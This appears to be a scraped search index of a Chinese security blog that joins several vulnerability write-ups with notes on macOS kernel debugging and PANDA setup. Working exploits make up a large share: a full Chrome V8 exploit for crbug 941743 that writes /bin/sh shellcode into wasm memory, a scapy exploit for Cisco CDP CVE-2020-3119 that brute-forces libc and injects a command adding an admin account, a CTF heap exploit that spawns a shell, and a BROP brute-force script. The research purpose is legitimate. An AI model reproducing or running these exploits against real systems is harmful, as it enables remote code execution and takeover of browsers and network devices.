这个函数调用时context参数可控，所以可以劫持流程，跳转到rop+shellcode里。 这种做法可以bypass CFG 参考exp from github [原创]“深入”探索CVE-2018-8174","link":"/2020/02/20/CVE-2018-8174-analysis/"},{"title":"CVE-2019-8604 analysis","text":"info1234567Available for: macOS Sierra 10.12.6, macOS High Sierra 10.13.6, macOS Mojave 10.14.4Impact: An application may be able to execute arbitrary code with system privilegesDescription: A memory corruption issue was addressed with improved memory handling.CVE-2019-8604: Fluoroacetate working with Trend Micro's Zero Day Initiative zdi的描述: 123This vulnerability allows remote attackers to escape the sandbox on affected installations of Apple Safari. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.The specific flaw exists within the securityd service. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this in conjunction with other vulnerabilities to execute code under the context of the current user. 还是zdi的描述详细，苹果的描述真的是不怎么可信。 vuln两种找到这个洞的方式，靠diff或者沿着这个描述尝试挖。 我首先试了试diff，因为我用的是 10.14.3和10.14.6，变化有点大，diff真的不好使。 所以我选择了第二种方式。 既然是直接获取了长度并使用，那就先确定该服务使用的ipc方式，然后找获取数据的函数的xref，然后一个一个看，没一会儿就能看到这个可疑的地方了： 10.14.3 1234567891011121314151617181920212223242526272829303132333435363738394041char __fastcall sub_100053185(__int64 a1, __int64 a2, __int64 a3){ __int64 v3; // rbx __int64 v4; // r15 const void *source; // r13 size_t length; // r14 void *v7; // r12 size_t v8; // r14 unsigned int v9; // eax char result; // al size_t v11; // [rsp+10h] [rbp-80h] char v12; // [rsp+18h] [rbp-78h] __int64 v13; // [rsp+60h] [rbp-30h] v3 = a3; v4 = xpc_dictionary_get_string(a3, &quot;_item_name&quot;); source = (const void *)xpc_dictionary_get_data(v3, &quot;_item_value&quot;, &amp;v11); if ( xpc_dictionary_get_value(v3, &quot;_item_sensitive_value_length&quot;) ) { length = xpc_dictionary_get_uint64(v3, &quot;_item_sensitive_value_length&quot;); v7 = malloc(length); memcpy(v7, source, length); memset_s(source, v11, 0LL, length); v11 = length; } else { v8 = v11; v7 = malloc(v11); memcpy(v7, source, v8); } v9 = xpc_dictionary_get_uint64(v3, &quot;_item_flags&quot;); sub_100005588(&amp;v12, v4, (unsigned int)v11, v7, v9); sub_1000532D4(*(_QWORD *)(a1 + 32), &amp;v12, &amp;v12); free(v7); sub_10005222C(&amp;v12); result = __stack_chk_guard; if ( __stack_chk_guard == v13 ) result = 1; return result;} copy的length可控，dst是根据用户的length分配的，但是source不一定有那么大，length又没有check，所以就越界读了。 patch by diff10.14.6 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364char __fastcall sub_10004405C(__int64 a1, __int64 a2, __int64 a3){ __int64 v3; // rbx __int64 v4; // r15 __int64 v5; // r12 const void *v6; // r13 unsigned __int64 length; // rax size_t v8; // r14 size_t v9; // r15 __int64 v10; // rbx size_t v11; // r14 void *v12; // r12 unsigned int v13; // eax char result; // al __int64 v15; // [rsp+10h] [rbp-90h] size_t data_length; // [rsp+18h] [rbp-88h] int v17; // [rsp+20h] [rbp-80h] size_t v18; // [rsp+24h] [rbp-7Ch] __int64 v19; // [rsp+70h] [rbp-30h] v3 = a3; v4 = a1; v5 = xpc_dictionary_get_string(a3, &quot;_item_name&quot;); v6 = (const void *)xpc_dictionary_get_data(v3, &quot;_item_value&quot;, &amp;data_length); if ( !xpc_dictionary_get_value(v3, &quot;_item_sensitive_value_length&quot;) ) { v15 = v5; v11 = data_length; v12 = malloc(data_length); memcpy(v12, v6, v11);LABEL_7: v13 = xpc_dictionary_get_uint64(v3, &quot;_item_flags&quot;); sub_1000045A2(&amp;v17, v15, (unsigned int)data_length, v12, v13); sub_10004422A(*(_QWORD *)(v4 + 32), &amp;v17, &amp;v17); free(v12); sub_10004306E(&amp;v17); goto LABEL_8; } length = xpc_dictionary_get_uint64(v3, &quot;_item_sensitive_value_length&quot;); v8 = length; v9 = data_length; if ( length &lt;= data_length ) // add length check { v15 = v5; v12 = malloc(length); memcpy(v12, v6, v8); memset_s(v6, v9, 0LL, v8); data_length = v8; v4 = a1; goto LABEL_7; } v10 = sub_100093B1E(&quot;SecurityAgentXPCQuery&quot;); if ( (unsigned __int8)os_log_type_enabled(v10, 0LL) ) { v17 = 134217984; v18 = v8; _os_log_impl(&amp;_mh_execute_header, v10, 0LL, aSensitiveDataL, &amp;v17, 12LL); }LABEL_8: result = __stack_chk_guard; if ( __stack_chk_guard == v19 ) result = 1; return result;} 取了要copy的data的长度，并且检查了用户传递来的size是不是小于等于这个值，之后再拷贝。 refZDI-19-766","link":"/2019/09/02/CVE-2019-8604-analysis/"},{"title":"Chrome M73 issue 941743","text":"1. bug info这是科恩实验室19年 blackhat USA议题中那套利用的rce部分，v8 JIT优化的漏洞。 类型混淆漏洞。 123456789101112131415161718192021222324➜ ~ ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js ## Fatal error in ../../src/elements.cc, line 881# Debug check failed: IsFastElementsKind(from_kind).####FailureMessage Object: 0x7fff3b6caa70==== C stack trace =============================== /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f95be106e1e] /home/jack/v8/v8/out/x64.debug/libv8_libplatform.so(+0x2d527) [0x7f95be0ac527] /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f95be0f4fb8] /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(+0x349fc) [0x7f95be0f49fc] /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f95be0f5092] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1585f80) [0x7f95bcf27f80] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1582a31) [0x7f95bcf24a31] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1a8b5b8) [0x7f95bd42d5b8] /home/jack/v8/v8/out/x64.debug/libv8.so(v8::internal::Runtime_TransitionElementsKind(int, unsigned long*, v8::internal::Isolate*)+0x117) [0x7f95bd42d247] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x212bd00) [0x7f95bdacdd00]Received signal 4 ILL_ILLOPN 7f95be104581[1] 8542 illegal hardware instruction (core dumped) ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js 2. poc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Impact version: 6.1.462+ var arr = [1];for (var i = 1; i &lt; 300; ++i) { var a2 = arr.map(function (v, i) { arr.push(1); }); arr.some(arr.constructor); for (var j = 0; j &lt; 1000000; ++j) {}}``` 1. array.map 方法，对array中每个元素执行参数指定的操作，然后返回一个新的数据2. array.some 方法，是一个检测![]( https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904645923418.jpg)这个patch在这个漏洞修补的commit里是有的，就这个poc：```javascript// Copyright 2019 the V8 project authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.// Flags: --allow-natives-syntax --noenable-slow-asserts// This call ensures that TurboFan won't inline array constructors.Array(2**30);// Set up a fast holey smi array, and generate optimized code.let a = [1, 2, ,,, 3];function mapping(a) { return a.map(v =&gt; v);}mapping(a);mapping(a);%OptimizeFunctionOnNextCall(mapping);mapping(a);// Now lengthen the array, but ensure that it points to a non-dictionary// backing store.a.length = (32 * 1024 * 1024)-1;a.fill(1,0);a.push(2);a.length += 500;// Now, the non-inlined array constructor should produce an array with// dictionary elements: causing a crash.mapping(a); 3. bug analysis作者的分析: The optimization of JSCreateArray (for |a2|) bailout at typed lowering phase. When executing JITed code, it calls to |Runtime_NewArray|. There’s a CheckMaps for |arr|, but it can’t ensure an array that produced by |arr| is the same type. For example, |arr| is extended by |push| and it has PACKED_SMI_ELEMENTS, but |a2| could be constructed by |Runtime_NewArray| and it could have DICTIONARY_ELEMENTS. TransitionAndStoreElement assumes the source array should be HOLEY_SMI_ELEMENTS, this can’t ensure either. Because when calling to |Runtime_NewArray| and array’s actual length &gt;= 0x4000000, there’ll be a dictionary elements array. So our bug occurs. issue-941743-cve-2019-5825 为什么开始需要一个 Array(2 ** 30) 12345678910111213141516171819if (argv.length() == 1) { Handle&lt;Object&gt; argument_one = argv.at&lt;Object&gt;(0); if (argument_one-&gt;IsSmi()) { int value = Handle&lt;Smi&gt;::cast(argument_one)-&gt;value(); if (value &lt; 0 || JSArray::SetLengthWouldNormalize(isolate-&gt;heap(), value)) { // the array is a dictionary in this case. can_use_type_feedback = false; } else if (value != 0) { holey = true; if (value &gt;= JSArray::kInitialMaxFastElementArray) { can_inline_array_constructor = false; } } } else { // Non-smi length argument produces a dictionary can_use_type_feedback = false; }} 所以只要can_use_type_feedback = false; 即可。 4. how to exploit?构造oobarray，利用oobarray去修改后面arraybuffer长度用来任意地址读写，利用oobarray读写leak_obj实现addrof和fakeobj原语。s 5. exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211/* exploit for crbug-941743*/is_in_v8_flag = true;// =================================================================// tookit// =================================================================var g_buffer = new ArrayBuffer(16);var g_float64 = new Float64Array(g_buffer);var g_uint64 = new BigUint64Array(g_buffer);function float2address(f) { g_float64[0] = f; return g_uint64[0];}function address2float(addr) { let i = BigInt(addr); g_uint64[0] = i; return g_float64[0];}function hex(i) { return '0x' + i.toString(16).padStart('0');}function info(msg) { console.log('[+] ' + msg);}function error(msg) { console.log('[-] ' + msg); exit(1);}function gc() { for (let i = 0; i &lt; 100; i++) { new ArrayBuffer(0x100000); }}function myprint(msg){ if(is_in_v8_flag){ print(msg); }else{ console.log(msg); }}// =================================================================// exploit part// =================================================================var max_iters = 10000;var max_search = 0x10000;Array(32760);// This call ensures that TurboFan won't inline array constructors.Array(2**30);// Set up a fast holey smi array, and generate optimized code.let a = [1, 2, ,,, 3];let oob_array;let leak_obj;let rw_arraybuffer;let obj = {}; //using for leak_objlet oob_array_length_offset = 23; // get this by debugginglet oob_array_storage_length_offset = oob_array_length_offset - 6;function inline(){ return a.map( (value, index) =&gt;{ if (index == 0){ oob_array = [1.1, 2.2]; leak_obj = {m:address2float(0xdeadbeef), n:obj}; rw_arraybuffer = new ArrayBuffer(0x4321); } if (index == oob_array_length_offset +1 ){ throw &quot;oob finished...&quot; } return index; });}inline();for(var i = 0; i &lt; max_iters; ++i) inline();// Now lengthen the array, but ensure that it points to a non-dictionary// backing store.a.length = (32 * 1024 * 1024)-1;a.fill(1, oob_array_storage_length_offset, oob_array_storage_length_offset + 1);a.fill(1, oob_array_length_offset);a.length += 500;leak_obj_offset = 0;rw_arraybuffer_offset = 0;function addrOf(obj){ leak_obj.n = obj; return Number(float2address(oob_array[leak_obj_offset]));}function fakeObj(obj_address){ oob_array[leak_obj_offset] = Number(float2address(obj_address)); return leak_obj.n;}function read64(addr){ oob_array[rw_arraybuffer_offset] = address2float(addr); let data_view = new DataView(rw_arraybuffer); return Number(float2address(data_view.getFloat64(0, true)));}// function write64(addr, value){// oob_array[rw_arraybuffer_offset] = address2float(addr);// let data_view = new DataView(rw_arraybuffer);// data_view.setFloat64(0, float2address(value), true);// }function write32(addr, value){ oob_array[rw_arraybuffer_offset] = address2float(addr); let data_view = new DataView(rw_arraybuffer); data_view.setInt32(0, value, true);}var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule, {});var func = wasmInstance.exports.main;try{ inline();}catch(e){ if(oob_array.length &gt; 2){ myprint(&quot;[+] oob successed!&quot;); myprint(&quot;[+] oob_array length is : &quot; + oob_array.length); }else{ throw &quot;oob Failed&quot; } for(var i = 0; i &lt; max_search; ++i){ var value = float2address(oob_array[i]); if(value == 0xdeadbeef){ leak_obj_offset = i + 1; break; } } for(var i = 0; i &lt; max_search; ++i){ var value = float2address(oob_array[i]); if(value == 0x4321){ rw_arraybuffer_offset = i + 1; break; } } if(leak_obj_offset == 0 || rw_arraybuffer_offset==0) throw &quot;get offset failed&quot; myprint(&quot;[+] leak_obj_offset : &quot; + leak_obj_offset); myprint(&quot;[+] rw_arraybuffer_offset : &quot; + rw_arraybuffer_offset); var wasm_func_addr = addrOf(func) - 1; myprint(&quot;[+] wasm func addr : &quot; + hex(wasm_func_addr)); var shared_info = read64(wasm_func_addr + 0x18) - 1; myprint(&quot;[+] wasm shared info : &quot; + hex(shared_info)); var data_address = read64(shared_info + 0x8) - 1; myprint(&quot;[+] data_address : &quot; + hex(data_address)); var instance_address = read64(data_address + 0x10) - 1; myprint(&quot;[+] instance_address : &quot; + hex(instance_address)); var rwx_address = read64(instance_address + 0x108); myprint(&quot;[+] rwx_address : &quot; + hex(rwx_address)); // %DebugPrint(func); // %SystemBreak(); write32(rwx_address, 0x99583b6a); write32(rwx_address + 0x4, 0x2fbb4852); write32(rwx_address + 0x8, 0x6e69622f); write32(rwx_address + 0xc, 0x5368732f); write32(rwx_address + 0x10, 0x57525f54); write32(rwx_address + 0x14, 0x050f5e54); // %SystemBreak(); // let's go to the shellcode func();} 6. referencecrbug-941743","link":"/2020/06/20/Chrome-M73-issue-941743/"},{"title":"Cisco CDP cve-2020-3119","text":"配置使用GNS3可以复现漏洞；使用EVE也可以，一个定制化的Linux，提供一个仿真环境，我当时两个方法都测试了,GNS3有点小坑，最后在EVE上测试通过的。 配置的流程其实都一样，进入console启动交换机。 12dirboot nxos.9.3.2.bin 设置密码 Root1234 配置nexus交换机。参考这里 12345678910111213141516switch# conf tEnter configuration commands, one per line. End with CNTL/Z.switch(config)# interface mgmt0switch(config-if)# ip address 10.0.2.15/24 &lt;--- NOTE: can use &quot;ip address dhcp&quot; here insteadswitch(config-if)in# no shutswitch(config-if)# endswitch# conf tEnter configuration commands, one per line. End with CNTL/Z.switch(config)# username vagrant password vagrant role network-adminswitch(config)# username vagrant shell bashswitch(config)# boot nxos bootflash:nxos.7.0.3.I2.2d.bin &lt;--- Note: use correct image name from &quot;dir&quot; command outputswitch(config)# copy r s[########################################] 100%Copy complete.switch(config)# 逆向直接反汇编bin有坑，需要gdbdump了看dump。 漏洞 1*(&amp;a1-&gt;levels + counter) = *(&amp;ptr + counter);// write what where 这里可以任意地址写。 利用123456Arch: i386-32-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: PIE enabledRPATH: b'/isan/lib/convert:/isan/lib:/isanboot/lib' 1ret_addr + JUNK + arg1 猜两个地址，stack base和 libc base， 以及heap address？ 存在栈上的堆地址怎么用呢？ret过去？ 123456789101112payload = [struct.pack('&lt;I', 0x0),'A' * 64,struct.pack('!h', 0xdeadbeef), # saved ebpstruct.pack('!h', libc_base + pop_ret_offset), # ret addrstruct.pack('!h', libc_base + libc_bss_offset), # a1struct.pack('!h', libc_base + pop_ret_offset),struct.pack('!h', 0xdeadbeef),...struct.pack('!h', libc_base + system_offset),struct.pack('!h', 0xdeadbeef),] 只需要猜system所在libc的基地址。 1234567891011121314junksaved ebpret addr; // pop ret即可a1pop retjunkpop retjunk...pop retjunksystem_addrxxxxcmd_str_addr a1只要是一个符合条件的指向data段的指针即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from scapy.contrib import cdpfrom scapy.all import Ether, LLC, SNAP, sendpfrom time import sleepimport structoffset_to_cmd = 40 # TODOlibc_bss_offset = 0x001B4EE0 + 0x200 # use for a1system_offset = 0x0003C790 # system funcpr_offset = 0x00021b07 # pop eax; ret# pppr_offset_offset = 0x000df5d2 # pop ebp ; pop edi ; pop ebx ; retppr_offset_offset = 0x000f5e5a # pop ebp ; pop ebx ; retcmd = '/isan/bin/vsh -c &quot;configure terminal ; username test password qweASD123 role network-admin&quot;'def gen(libc_base): payload = &quot;&quot; payload += struct.pack('&gt;I', 0x0) + 'A' * 64 payload += struct.pack('&gt;I', 0x00001337) + struct.pack('&gt;I', libc_base + pr_offset) # saved ebp + ret addr payload += struct.pack('&gt;I', libc_base + libc_bss_offset) # a1 if offset_to_cmd % 2 == 1: payload += (struct.pack('&gt;I', libc_base + pr_offset) + struct.pack('&gt;I', 0x00001337)) * offset_to_cmd else: payload += struct.pack('&gt;I', libc_base + ppr_offset_offset) + struct.pack('&gt;I', 0x00001337) * 2 payload += (struct.pack('&gt;I', libc_base + pr_offset) + struct.pack('&gt;I', 0x00001337)) * (offset_to_cmd - 3) payload += struct.pack('&gt;I', libc_base + system_offset) + struct.pack('&gt;I', 0x00001337) return payloaddef exploit(payload): # link layer l2_packet = Ether(dst=&quot;01:00:0c:cc:cc:cc&quot;) # Logical-Link Control l2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() # Cisco Discovery Protocol cdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180) deviceid = cdp.CDPMsgDeviceID(val=cmd) portid = cdp.CDPMsgPortID(iface=b&quot;ens38&quot;) address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr=&quot;192.168.204.77&quot;)) cap = cdp.CDPMsgCapabilities(cap=1) power_req = cdp.CDPMsgUnknown19(val=payload) power_level = cdp.CDPMsgPower(power=16) cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level packet = l2_packet / cdp_packet sendp(packet)def main(): assert offset_to_cmd !=0 for libc_base in range(0xf5000000, 0xf5fff000, 0x1000): try: print('[*] Exploiting...guess libc on {0}'.format(hex(libc_base))) payload = gen(libc_base) exploit(payload) except Exception as e: print(e) sleep(5)def test(): payload = gen(0xf5dd9000) exploit(payload)if __name__ == '__main__': # main() test() referenceCVE-2020-3119 Cisco CDP 协议栈溢出漏洞分析s","link":"/2020/04/23/Cisco-CDP-cve-2020-3119/"},{"title":"HITCON-2016-Quals-SecretHolder","text":"0x00:前几天hitcon2016开啦，就想着去看看题，学习下，pwn100的这个SecretHolder是个double free的洞，但是当时并不知道怎么去搞，今天刚从Icemakr师傅那里学到了思路，所以就记录一下。 0x01: 程序分析程序很容易分析 1234567891011121314151617181920212223242526272829303132void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ int choice; // eax@2 char s; // [sp+10h] [bp-10h]@2 __int64 v5; // [sp+18h] [bp-8h]@1 v5 = *MK_FP(__FS__, 40LL); sub_400C80(a1, a2, a3); puts(\"Hey! Do you have any secret?\"); puts(\"I can help you to hold your secrets, and no one will be able to see it :)\"); while ( 1 ) { puts(\"1. Keep secret\"); puts(\"2. Wipe secret\"); puts(\"3. Renew secret\"); memset(&amp;s, 0, 4uLL); read(0, &amp;s, 4uLL); choice = atoi(&amp;s); switch ( choice ) { case 2: wipe_secret(); break; case 3: renew_secret(); break; case 1: keep_secret(); break; } }} 新建块的时候 123456789101112131415161718192021222324252627if ( size_of_secret == 2 ) // big{ if ( !flag_big ) { big_buffer = calloc(1uLL, 4000uLL); flag_big = 1; puts(\"Tell me your secret: \"); read(0, big_buffer, 4000uLL); }}else if ( size_of_secret == 3 ) // huge{ if ( !flag_huge ) { huge_buffer = calloc(1uLL, 400000uLL); flag_huge = 1; puts(\"Tell me your secret: \"); read(0, huge_buffer, 400000uLL); }}else if ( size_of_secret == 1 &amp;&amp; !flag_small )// samll{ small_buf = calloc(1uLL, 40uLL); flag_small = 1; puts(\"Tell me your secret: \"); read(0, small_buf, 40uLL);} 释放块的时候 123456789101112131415switch ( wipe_choice ) { case 2: free(big_buffer); flag_big = 0; break; case 3: free(huge_buffer); flag_huge = 0; break; case 1: free(small_buf); flag_small = 0; break; } 在.bss段上有标志位，标志着当前这种块有没有被使用。 问题是，每种块只能建一次，而且 huge buffer是mmap出来的，我以为就没啥用了…今天看了师傅的博客才知道 实际上，先创建huge note，再free huge note之后，再次创建huge note时，malloc就会用sbrk来分配内存了，之后就是常规的double free了。 思路get，就可以接着搞了。 0x02:分配huge，释放huge，然后分配small，big，然后释放small，big，再分配huge时，分配的huge内存分配就如图所示了。可以根据这个伪造堆块，然后去free(big_chunk)，之后就可以得到.bss上一个地址啦，接着就可以去做leak，修改got的事情了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697 from zio import * from time import sleep #target = './SecretHolder' target = ('127.0.0.1',10001) io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green')) big_note_addr = 0x6020a0 huge_note_addr = 0x6020a8 small_note_addr = 0x6020b0 got_atoi_addr = 0x602070 got_free_addr = 0x602018 plt_puts_addr = 0x4006c0 #ubuntu 16.04 offset_system_atoi = 0xe510 def Keep_secret(size,content): io.read_until('3. Renew secret') io.writeline('1') io.read_until('3. Huge secret') io.writeline(str(size)) io.read_until('Tell me your secret:') io.writeline(str(content)) def Wipe_secret(size): io.read_until('3. Renew secret') io.writeline('2') io.read_until('3. Huge secret') io.writeline(str(size))def Renew_secret(size,new_content): io.read_until('3. Renew secret') io.writeline('3') io.read_until('3. Huge secret') io.writeline(str(size)) io.read_until('Tell me your secret:') io.writeline(str(new_content)) #small = 1 #big = 2 #huge = 3 #malloc huge and free it. Keep_secret(3,\"C\"*0x100) Wipe_secret(3) #malloc small chunk and big chunk. Keep_secret(1,\"A\"*0x20) Keep_secret(2,\"B\"*0x80) #free small and big chunk. Wipe_secret(1) Wipe_secret(2) payload = l64(0x0) + l64(0x30) + l64(huge_note_addr - 0x8 * 3) + l64(huge_note_addr - 0x8 * 2) # chunk 1 (free'd) payload += l64(0x20) + l64(0xa0) payload += 'A' * 0x90 # chunk 2 payload += l64(0x0) + l64(0xa1) payload += 'A' * 0x90 # chunk 3 payload += l64(0x0) + l64(0xa1) #raw_input('0x000000000040086D') Keep_secret(3,payload) #free big chunk --&gt; unlink bug here. #raw_input('0x0000000000400A27') Wipe_secret(2) #overwrite ptrs on .bss payload_leak = \"A\"*0x10 payload_leak += l64(got_atoi_addr) + l64(got_free_addr) + l64(got_atoi_addr) payload_leak += l32(0x1)*3 #raw_input('0x0000000000400B1E') Renew_secret(3,payload_leak) #overwrite free@got to make info leak. payload_overwrite = l64(plt_puts_addr) + l64(plt_puts_addr+0x6) #leak #raw_input('0x0000000000400B1E') Renew_secret(3,payload_overwrite) Wipe_secret(2) tmp = io.read(8)[1:][::-1][1:][::-1] leak_atoi_addr = l64(tmp.ljust(8,'\\x00')) print \"system addr : 0x%x\" % leak_atoi_addr system_addr = leak_atoi_addr + offset_system_atoi print \"system addr : 0x%x\" % system_addr raw_input('0x0000000000400B1E') Renew_secret(1,l64(system_addr)) io.write('/bin/sh\\0') io.interact() 不知道为啥io.gdb_hint()没断下来，所以我打断点都是用raw_input()然后attach进去搞的，所以exp看起来贼乱… 0x03:参考 Icemakr师傅的文章","link":"/2016/10/11/HITCON-2016-Quals-SecretHolder/"},{"title":"Final","text":"随笔 今天终于办完了校赛的决赛，第二次参与出题、运维工作。 去年是学长主力做运维工作，今年到了自己，真的是挺难的。 在这次规模较大的情况下(20支队伍)，怎么配置pwn相关的权限，集中管理pwn服务，怎么做check…真的是做的时候才发现坑有多少。运维脚本从本来以为的100多行写道快500行，功能基本完备，还有待改善吧。 最后，大三要结束了，完成了算是大三最后的一个任务 - 。- 还算不错，小伙伴们都辛苦了。修仙修的人都不好了","link":"/2017/06/19/Final/"},{"title":"Debug macOS Kernel","text":"0x00 : 环境配置基本分为两种情况，虚拟机调试或者双机调试。 虚拟机 ： vmfusion,`` KDK` 双机: 火线。 我这里用的是``mbp2017调mbp2015，借了同事的线，连接为：mbp2017-typec-雷电2-火线-雷电2-mbp2015`。 0x01 : 虚拟机下面是标准步骤 vm 关闭SIP，并且把想要加载的内核拷贝到 内核的目录 sudo cp /Library/Developer/KDKs/KDK_YOUR_VERSION/System/Library/Kernels/kernel.development /System/Library/Kernels 安装当前版本系统的KDK，[Apple Develop KDK download](https://developer.apple.com/download/more/?q=Kernel Debug Kit) 设置启动参数 sudo nvram boot-args=&quot;debug=0x14e kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot; 清理缓存 sudo kextcache -invalidate / 记住当前vm的ip，然后重启 sudo reboot 这里把development版本的内核拷贝到System/Library/Kernels里，指定启动时加载development版本的内核，当然也可以加载kasan版本的，看需求。 host 安装被调试机器的KDK 这种情况是靠网络调试。 但是根据之前的启动参数，开机时断不下来的，当然可以设置一个0x1来让他启动时断下来等调试器，但是经过测试，这个不好使(可能我环境有问题)。 如果按照上面的设置0x14e ，那么需要在虚拟机中按下 cmd + opt + ctrl + shitf+ esc触发中断， 随后lldb中 : 12$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development(lldb)kdp-remote you_vm_ip 之后就可以调试了。 0x02 : 双机调试下面是标准步骤 被调试机 关SIP，拷贝KDK里的内核到/System/Library/Kernels 安装当前系统版本的KDK 设置启动参数 sudo nvram boot-args=&quot;debug=0x14e kdp_match_name=firewire fwkdp=0x8000 kcsuffix=development&quot; 清理缓存 sudo kextcache -invalidate / 重启 sudo reboot 这里必须说一下，火线的名称，ifconfig里看到的，默认是fw0，但是这个启动参数里必须是firewire， 必须是firewire，必须是firewire！ 这个地方坑了我挺久，我一直以为用ifconfig里看到的那个名字 :-( 调试机 安装被调试机器的KDK LLDB加载目标内核 12$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development(lldb) 启动fwkdp fwkdp -v 被调试机按下cmd+opt+ctrl+shift+esc触发中断 lldb 里连接 (lldb) kdp-remote localhost 感觉过程就是fwkdp做了转发的工作，所以lldb直接kdp-remote就可以了。 0x03 : KDK是必须的吗？并不是，kdk只是给你更多的内核中的符号，所以不用kdk也没事，就等于直接调试正式版的内核，少了内核符号而已，人肉对比着近期版本的源码其实影响没那么大。","link":"/2019/10/17/Debug-macOS-Kernel/"},{"title":"Hello PANDA","text":"0. EnvironmentUbuntu16.04 x64 1. Install Panda123git clone https://github.com/moyix/panda.gitcd panda./panda_install.bash 2. Working Folder and HDD123$ mkdir my_first_panda$ cd my_first_panda$ ../qemu/qemu-img create -f qcow2 test.img 32G 3. Boot VM1../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024 you will get: 123456➜ my_first_panda git:(master) ✗ ../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024(process:21836): GLib-WARNING **: /build/glib2.0-7ZsPUq/glib2.0-2.48.2/./glib/gmem.c:483: custom memory allocation vtable not supportedQEMU 1.0,1 monitor - type 'help' for more information(qemu) change ide1-cd0 win_server_2008_r2.iso (qemu) mount your iso file: 12(qemu) change ide1-cd0 win_server_2008_r2.iso (qemu) 4. Install OSConnect your vm with a VNC client, press ctrl + opt + del(on macOS) / ctrl + alt + del(on Windows) to reboot your vm,then you are able to install the OS. 5. Record/Replay with PANDA1(qemu) begin_record test …. 1(qemu) end_record now you can replay (with replay movie plugin) 1../qemu/x86_64-softmmu/qemu-system-x86_64 -replay test -panda replaymovie -m 2048 other plugins? Taint?cov? :) 6. ReferenceMy first panda Panda Usage","link":"/2018/11/08/Hello-PANDA/"},{"title":"Have fun with Blind ROP","text":"0x00: 关于BROP第一次遇到BROP是在HCTF 2016，当时并没有搞定这个东西，前一段时间花了点时间研究了下这种利用方式，搞定了那个题目，顺便也看了下关于BROP的论文和slide，实践了下使用BROP技术搞低版本的ngnix。 0x01: 先说CTF中遇到的比赛结束后，杭电的师傅们把题目都开源丢github了，所以我直接拿来源码自己编译自己搞了，源码如下 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int i;int check();int main(void){ setbuf(stdin,NULL); setbuf(stdout,NULL); setbuf(stderr,NULL); for(;;){ puts(&quot;WelCome my friend,Do you know password?&quot;); if(!check()){ puts(&quot;Do not dump my memory&quot;); }else { puts(&quot;No password, no game&quot;); } } return 0;}int check(){ char buf[50]; read(STDIN_FILENO,buf,1024); return strcmp(buf,&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;);} 比赛的时候这个题目只给了ip和端口，其他信息就没有了，后面给出了bof的buffer大小作为提示。那么根据这个大小可以计算出payload的结构，所以就可以使用BROP的思路去一步一步搞定这个题目了。 0x02：过程1. 找到hang addr首先要找到这样一个覆盖ret addr后不会引起服务崩溃的地址，我的做法是暴力跑，利用pwntools的异常处理来判断连接是否挂掉了。就像这样简单粗暴的从0x400000去跑，然后log进文件，最后我只要去查看文件就知道hang addr是什么了。 123456789101112131415161718192021222324def log_in_file(addr): #f = open('log.txt','a') #f = open('gadgets.txt','a') f = open('res.txt','a') f.write(&quot;ok addr : 0x%x\\n&quot; % addr) f.close()def get_hang_addr(addr): p = remote('127.0.0.1',10001) payload = &quot;A&quot; * 72 + p64(addr) p.recvuntil('WelCome my friend,Do you know 